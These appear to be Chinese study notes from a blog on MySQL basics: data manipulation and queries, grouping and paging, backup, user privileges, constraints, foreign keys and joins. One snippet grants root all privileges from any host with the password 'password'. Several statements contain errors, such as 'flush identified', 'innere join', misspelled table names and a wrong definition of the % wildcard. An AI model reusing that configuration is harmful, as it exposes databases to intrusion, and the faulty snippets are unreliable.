<h3 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h3><h4 id="插入insert"><a href="#插入insert" class="headerlink" title="插入insert"></a>插入insert</h4><h5 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h5><ol>
<li><p>列名和值一致</p>
</li>
<li><p>除了数字类型，其他类型需要使用引号引起来</p>
</li>
<li><p>默认值null</p>
</li>
</ol>
<h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><ol>
<li>所有字段都赋值</li>
</ol>
<p>​        <strong>INSERT INTO</strong> student3(id,sname,age,score,birthday,mark) <strong>VALUES</strong>(1001,’张三’,20,90.5,’2000-11-10’,”英语”)</p>
<ol start="2">
<li>部分字段赋值</li>
</ol>
<p>​        INSERT INTO student3(id,sname,age) <strong>VALUES</strong> (1000,’李四’,12);</p>
<ol start="3">
<li>省略字段名</li>
</ol>
<p>​        INSERT INTO student3 <strong>VALUES</strong>(1001,’张三’,NULL,90.5,’2000-11-10’,”英语”)</p>
<ol start="4">
<li>一次添加多条记录</li>
</ol>
<p>INSERT INTO student3 **VALUES(**1001,’张三’,20,90.5,’2000-11-10’,”英语”),(1001,’张三’,20,90.5,’2000-11-10’,”英语”)</p>
<h4 id="删除delete"><a href="#删除delete" class="headerlink" title="删除delete"></a>删除delete</h4><ol>
<li><p><strong>delete from</strong>  xx <strong>where</strong> score&gt;=90;   不加条件，则删除表中所有记录    </p>
</li>
<li><p><strong>truncate</strong> table student; 一次删除       </p>
</li>
<li><p><strong>delete from xx</strong>; 一次记录删除一次</p>
</li>
</ol>
<h4 id="更新update"><a href="#更新update" class="headerlink" title="更新update"></a>更新update</h4><ol>
<li><strong>UPDATE</strong> student3 <strong>SET</strong> score=90,age=22,birthday=’1998-05-12’ <strong>WHERE</strong> id=1002;</li>
</ol>
<h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><blockquote>
<p>select查询：不会对数据库中的数据进行修改，从数据库发送结果给客户端，是虚拟的表</p>
</blockquote>
<ol>
<li><p>查询指定列：select name,age from student;</p>
</li>
<li><p>消除重复(<strong>distinct</strong>)：select <strong>distinct</strong> job from emp;</p>
</li>
<li><p>计算列(+)，别名(<strong>as</strong>) ：SELECT ename <strong>AS</strong> 姓名,sal AS 薪资,comm AS 奖金,<strong>comm+sal</strong> <strong>AS</strong> 月收入 from emp;</p>
</li>
<li><p>判断空值{  ifnull(comm,0)将null视为0  } ：select comm,<strong>IFNULL(comm,0)</strong> from emp;</p>
</li>
</ol>
<blockquote>
<p>where：可以对行进行筛选： select id,sname,age from student <strong>where</strong> age&gt;=20;</p>
</blockquote>
<ol>
<li><p>条件查询( <strong>&gt;=、&lt;&gt;/ !=</strong> )</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">from</span> student <span class="keyword">where</span> age&gt;=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">from</span> student <span class="keyword">where</span> age&lt;&gt;<span class="number">20</span>;	<span class="comment">-- 不等于20</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">from</span> student <span class="keyword">where</span> age!=<span class="number">20</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不等于(<strong>not</strong>)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">not</span> age=<span class="number">20</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>关联( <strong>and</strong> / <strong>between</strong> <strong>and</strong> )</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- and </span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> age&gt;<span class="number">20</span> <span class="keyword">AND</span> age&lt;<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &amp;&amp;</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> age&gt;=<span class="number">20</span> &amp;&amp; age&lt;<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- between and </span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> age **<span class="keyword">BETWEEN</span>** <span class="number">20</span> **<span class="keyword">AND</span>** <span class="number">30</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>或者( <strong>or</strong>)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- or</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> age=<span class="number">20</span> <span class="keyword">OR</span> age=<span class="number">18</span> <span class="keyword">OR</span> age =<span class="number">45</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>范围( <strong>in</strong>)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> age <span class="keyword">IN</span>(<span class="number">20</span>,<span class="number">18</span>,<span class="number">45</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>is</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- is</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> english <span class="keyword">IS</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- is not</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> english <span class="keyword">IS</span> <span class="keyword">not</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><blockquote>
<ul>
<li><p>下划线  <strong>_</strong>：代表一个字符</p>
</li>
<li><p>百发号**%**：代表至少一个字符</p>
</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询第二个字为德的同学    </span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">WHERE</span> studentname <span class="keyword">LIKE</span> <span class="string">&#x27;_德%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><blockquote>
<p><strong>count(列名)、max(最大值) 、min(最小值) 、sum(和)、avg(平均数)</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询员工人数 count(*)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(empno) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询工资总额    </span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(sal) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 平均工资  </span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AVG</span>(sal) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 最大工资  </span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(sal) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 总月收入</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(sal+<span class="keyword">IFNULL</span>(comm,<span class="number">0</span>)) <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(sal)+<span class="keyword">SUM</span>(comm)<span class="keyword">FROM</span> emp;</span><br></pre></td></tr></table></figure>

<h3 id="分组group-by"><a href="#分组group-by" class="headerlink" title="分组group by"></a>分组group by</h3><blockquote>
<p><strong>group by之后查询的字段，分组字段、聚合函数</strong></p>
</blockquote>
<h4 id="单组"><a href="#单组" class="headerlink" title="单组"></a>单组</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询男女各自的人数       </span></span><br><span class="line"><span class="keyword">SELECT</span> gender <span class="keyword">AS</span> 性别,<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> 人数 <span class="keyword">FROM</span> student <span class="keyword">GROUP</span> <span class="keyword">BY</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 按照性别分组，分别查询男、女同学的数学平均分，人数，要求:分数低于70，不参与分组</span></span><br><span class="line"><span class="keyword">SELECT</span> gender,<span class="keyword">AVG</span>(math),<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> math&gt;=<span class="number">70</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> gender;</span><br></pre></td></tr></table></figure>

<h4 id="having-和-where"><a href="#having-和-where" class="headerlink" title="having 和 where"></a>having 和 where</h4><p>a、where 在分组前进行限定，having在分组后进行限定</p>
<p>b、where 后不可以跟聚合函数，having可以进行聚合函数的判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 按照性别分组，分别查询男、女同学的数学平均分，人数，要求:分数低于70，不参与分组</span></span><br><span class="line"><span class="keyword">SELECT</span> gender,<span class="keyword">AVG</span>(math),<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> math&gt;=<span class="number">70</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询各个部门的人数，只显示人数大于8个的部门</span></span><br><span class="line"><span class="keyword">SELECT</span> deptno,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> emp <span class="keyword">GROUP</span> <span class="keyword">BY</span> deptno <span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(*)&gt;<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询每个部门的部门编号以及每个部门工资大于1500的人数</span></span><br><span class="line"><span class="keyword">SELECT</span> deptno,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> sal&gt;<span class="number">1500</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> deptno;</span><br></pre></td></tr></table></figure>

<h4 id="多组分组"><a href="#多组分组" class="headerlink" title="多组分组"></a>多组分组</h4><blockquote>
<p>使用逗号进行分隔</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询某个专业的某门课程的总分,平均</span></span><br><span class="line"><span class="keyword">SELECT</span> speciality,coursename,<span class="keyword">SUM</span>(score),<span class="keyword">AVG</span>(score) <span class="keyword">FROM</span> scores,course,studentinfo <span class="keyword">WHERE</span> </span><br><span class="line">scores.courseno=course.courseno <span class="keyword">AND</span> scores.studentno=studentinfo.studentno </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> speciality,coursename;</span><br></pre></td></tr></table></figure>

<h3 id="排序order-by"><a href="#排序order-by" class="headerlink" title="排序order by"></a>排序order by</h3><blockquote>
<p>descend降序   ascend升序</p>
</blockquote>
<h4 id="单组-1"><a href="#单组-1" class="headerlink" title="单组"></a>单组</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 按年龄升序排序,默认升序       </span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> student <span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">ASC</span>;</span><br><span class="line"><span class="comment">-- 按年龄降序排序                       </span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<h4 id="多组排序"><a href="#多组排序" class="headerlink" title="多组排序"></a>多组排序</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 年龄降序，相同年龄按数学成绩降序</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> student <span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">DESC</span>,math <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<h3 id="分页limit"><a href="#分页limit" class="headerlink" title="分页limit"></a>分页limit</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">3</span>;	<span class="comment">-- 第一页 (pageno-1)*pagesize</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">LIMIT</span> <span class="number">3</span>,<span class="number">3</span>;	<span class="comment">-- 第二页</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">LIMIT</span> <span class="number">6</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">LIMIT</span> <span class="number">9</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">LIMIT</span> <span class="number">12</span>,<span class="number">3</span>;（8）顺序</span><br></pre></td></tr></table></figure>

<h2 id="备份与还原"><a href="#备份与还原" class="headerlink" title="备份与还原"></a>备份与还原</h2><ol>
<li><p>备份格式：dos: mysqldump -u用户名 -p密码 数据库&gt;文件的路径</p>
</li>
<li><p>还原格式：mysql中的命令，需要登录后操作</p>
</li>
</ol>
<p>​                    <strong>use 数据库； source 导入文件的路径</strong></p>
<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p><strong>查看用户名</strong>    select *from user; <strong>选择mysql数据库</strong></p>
<h3 id="创建用户create"><a href="#创建用户create" class="headerlink" title="创建用户create"></a>创建用户create</h3><p><strong>主机名</strong>： <strong>localhost</strong>本地登录，**%**可异地登陆</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> ‘用户名’ @‘主机名’ <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="设置权限grant"><a href="#设置权限grant" class="headerlink" title="设置权限grant"></a>设置权限grant</h3><p><strong>grant</strong> 权限1，权限2 <strong>on</strong> 数据库名.表名 <strong>to</strong> ‘用户名‘@’主机名’;</p>
<p>权限：create/alter/select/insert/update /<strong>all</strong></p>
<h3 id="回收权限revoke"><a href="#回收权限revoke" class="headerlink" title="回收权限revoke"></a>回收权限revoke</h3><p><strong>revoke</strong> 权限1，权限2 <strong>on</strong> 数据库名.表名 <strong>from</strong> ‘用户名‘@’主机名’;</p>
<h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看 </span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span> <span class="keyword">for</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除用户</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 管理员</span></span><br><span class="line">mysqladmin -uroot -p password 新密码</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 普通用户： </span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">password</span> <span class="keyword">for</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>= <span class="keyword">password</span>(<span class="string">&#x27;新密码&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="解决mysql本地ip地址不能访问"><a href="#解决mysql本地ip地址不能访问" class="headerlink" title="解决mysql本地ip地址不能访问"></a>解决mysql本地ip地址不能访问</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 修改ip访问权限</span><br><span class="line">update user set host&#x3D;&#39;%&#39; where user&#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 授予所有权限</span><br><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;password&#39;;</span><br><span class="line">flush identified;</span><br></pre></td></tr></table></figure>

<h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><blockquote>
<p>对表中数据进行限制，保证数据的正确性、有效性和完整性</p>
</blockquote>
<h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><p>特点：<strong>非空not null、唯一unique</strong></p>
<blockquote>
<ul>
<li><p>主键只能设置一个，可以是单列或者多列</p>
</li>
<li><p>主键不能重复</p>
</li>
<li><p>primary key 用来唯一标识数据库中的每一条记录</p>
</li>
</ul>
</blockquote>
<ol>
<li>创建表时<strong>添加</strong>主键且<strong>主键自增</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">	字段名  字段类型 primary <span class="keyword">key</span>  auto_increment</span><br><span class="line">)auto_increment=初始值（默认为<span class="number">1</span>）；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>已有表中添加主键</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> primary <span class="keyword">key</span>(<span class="keyword">id</span> );</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>删除主键</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> str5 <span class="keyword">drop</span> primary <span class="keyword">key</span>;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>修改</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 修改表，添加自增长</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">modify</span> <span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改起始值   </span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 auto_increment=<span class="number">2000</span>; </span><br></pre></td></tr></table></figure>

<ol start="5">
<li>联合主键</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> scores(</span><br><span class="line">	studentno <span class="built_in">varchar</span>(<span class="number">22</span>),</span><br><span class="line">	courseno <span class="built_in">int</span>,</span><br><span class="line">	score <span class="built_in">int</span>,</span><br><span class="line">	primary <span class="keyword">key</span>(studentno，id.)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="唯一约束"><a href="#唯一约束" class="headerlink" title="唯一约束"></a>唯一约束</h2><blockquote>
<p>unique 表中某一列出现重复的值</p>
</blockquote>
<ol>
<li>创建表时添加唯一约束</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">	age <span class="built_in">int</span>  <span class="keyword">unique</span>,</span><br><span class="line">	<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>已有表添加唯一约束</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> st4 **<span class="keyword">modify</span>** <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">unique</span>;</span><br></pre></td></tr></table></figure>

<h2 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h2><ol>
<li>创建表时添加唯一约束</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">	age <span class="built_in">int</span>  <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">	<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>已有表添加唯一约束</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> st4 <span class="keyword">modify</span> <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><blockquote>
<p>字符段 字符类型  <strong>default</strong>   默认值</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span>(<span class="number">18</span>,<span class="string">&#x27;欧&#x27;</span>,<span class="keyword">default</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 （age,<span class="keyword">name</span>）<span class="keyword">values</span>(<span class="number">18</span>,<span class="string">&#x27;是&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> st4 <span class="keyword">modify</span> <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">default</span> <span class="string">&#x27;看看&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><blockquote>
<p>让表于表产生关系，从而保证数据的正确性</p>
<p><strong>主表和从表设置主键约束，从表创建约束</strong></p>
</blockquote>
<h3 id="新增外键"><a href="#新增外键" class="headerlink" title="新增外键"></a>新增外键</h3><ol>
<li>新建表时增加外键</li>
</ol>
<blockquote>
<p>constraint 外键约束名称  foreign key(外键字段名) references 主表名(主键约束名)</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp2(</span><br><span class="line">	empno <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> AUTO_INCREMENT,</span><br><span class="line">	ename <span class="built_in">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">	deptno <span class="built_in">INT</span>,</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> fk_emp2_deptno <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(deptno) <span class="keyword">REFERENCES</span> dept2(deptno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>已有表增加外键</li>
</ol>
<blockquote>
<p>alter table 从表 add constraint 外键约束名称 foreign key(外键字段名) references 主表名(主表外键约束字段名)</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp2 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_emp2_deptno <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(deptno) <span class="keyword">REFERENCES</span> dept2(deptno);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>删除外键</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 从表 <span class="keyword">drop</span> <span class="keyword">foreign</span> <span class="keyword">key</span> 外键约束名；</span><br></pre></td></tr></table></figure>

<h3 id="外键级联"><a href="#外键级联" class="headerlink" title="外键级联"></a>外键级联</h3><p><strong>on update cascade, on delete cascade</strong></p>
<blockquote>
<p>修改和删除主表的主键时，同时更新或删除副表的外键值，称为级联操作</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CONSTRAINT fk_emp22_dept22 FOREIGN KEY(deptno)REFERENCES dept22(deptno) ON <span class="keyword">UPDATE</span> <span class="keyword">CASCADE</span> <span class="keyword">ON</span>  <span class="keyword">DELETE</span> <span class="keyword">CASCADE</span>;</span><br></pre></td></tr></table></figure>

<h3 id="外键操作"><a href="#外键操作" class="headerlink" title="外键操作"></a>外键操作</h3><blockquote>
<p>都是用来限制父表操作的外键操作</p>
</blockquote>
<blockquote>
<p>restrict/no action : 在子表有关联记录的情况下，父表不能更新。</p>
<p>cascade：父表在更新或删除时，更新或删除子表对应的记录</p>
<p>set null ：父表在更新或删除时，子表的对应被set null</p>
</blockquote>
<h1 id="多表关联查询"><a href="#多表关联查询" class="headerlink" title="多表关联查询"></a>多表关联查询</h1><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><blockquote>
<p><strong>union all</strong> (加法)，列数、列类型必须相同</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t2;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t1 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t2;</span><br></pre></td></tr></table></figure>

<h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><blockquote>
<p>笛卡尔积：select *from <strong>emp,dept</strong></p>
</blockquote>
<h3 id="相等查询"><a href="#相等查询" class="headerlink" title="相等查询"></a>相等查询</h3><blockquote>
<p><strong>有外键连接</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp,dept <span class="keyword">WHERE</span> emp.deptno=dept.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询各个部门的人数，求显示部门名称，人数，只显示三个人以上的部门</span></span><br><span class="line"><span class="keyword">SELECT</span> dname,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> emp,dept <span class="keyword">WHERE</span> emp.deptno=dept.deptno <span class="keyword">GROUP</span> <span class="keyword">BY</span> dname <span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(*)&gt;<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h3 id="三表关联"><a href="#三表关联" class="headerlink" title="三表关联"></a>三表关联</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- and </span></span><br><span class="line"><span class="keyword">select</span> scores.studentno,studentname,scores.courseno,coursename,score <span class="keyword">from</span> scores,studnetinfo,course <span class="keyword">where</span> scores.studentno=studentinfo.studentno <span class="keyword">and</span> scores.courseno=course.courseno</span><br><span class="line"></span><br><span class="line"><span class="comment">-- inner join  on </span></span><br><span class="line"><span class="keyword">select</span> scores.studentno,studentname,scores.courseno,coursename,score <span class="keyword">from</span> scores innere <span class="keyword">join</span> studentinfro <span class="keyword">on</span> scores.studentno=studentifno.studentno <span class="keyword">inner</span> <span class="keyword">join</span> course <span class="keyword">on</span> scores.courseno = course.courseno;</span><br></pre></td></tr></table></figure>

<h2 id="不等查询"><a href="#不等查询" class="headerlink" title="不等查询"></a>不等查询</h2><blockquote>
<p><strong>无外键连接</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询各个员工的编号，姓名，职位，工资，工资等级</span></span><br><span class="line"><span class="keyword">SELECT</span> empno,ename,job,sal,grade <span class="keyword">FROM</span> emp,salarygrade <span class="keyword">WHERE</span> sal&gt;=losalary <span class="keyword">AND</span> sal&lt;hisalary;</span><br></pre></td></tr></table></figure>

<h2 id="表连接"><a href="#表连接" class="headerlink" title="表连接"></a>表连接</h2><h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><p><strong>inner join  on</strong>  </p>
<blockquote>
<p>组合两个表中的记录，返回关联字段相符的记录，也就是<strong>返回两个表的交集（阴影）部分</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empno,ename,job,e.deptno,dname <span class="keyword">FROM</span> emp e <span class="keyword">INNER</span> <span class="keyword">JOIN</span> dept d <span class="keyword">ON</span> e.deptno=d.deptno;</span><br></pre></td></tr></table></figure>

<h3 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h3><p><strong>left outer join</strong></p>
<blockquote>
<p><strong>左表不符合条件的也显示出来</strong>–null</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empno,ename,job,e.deptno,dname <span class="keyword">FROM</span> emp e <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> dept d <span class="keyword">ON</span> e.deptno=d.deptno;</span><br></pre></td></tr></table></figure>

<h3 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h3><p><strong>right outer join</strong></p>
<blockquote>
<p>右表不符合条件的也显示出来</p>
</blockquote>
